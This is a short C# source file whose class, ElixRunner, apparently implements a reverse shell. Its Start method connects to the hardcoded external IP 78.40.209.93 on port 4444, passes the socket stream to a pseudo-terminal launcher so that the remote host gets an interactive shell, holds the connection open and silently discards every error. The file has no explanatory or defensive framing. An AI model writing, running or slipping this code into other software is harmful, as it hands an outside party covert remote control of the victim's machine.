public class ElixRunner {
    public static void Start() {
        
        string host = "78.40.209.93"; 
        int port = 4444;

        try {
            
            using (System.Net.Sockets.TcpClient client = new System.Net.Sockets.TcpClient(host, port)) {
                
                PtyLauncher.Run(client.GetStream(), 80, 24);
                
                
                while (client.Connected) {
                    System.Threading.Thread.Sleep(1000);
                }
            }
        } catch {
            
        }
    }
}
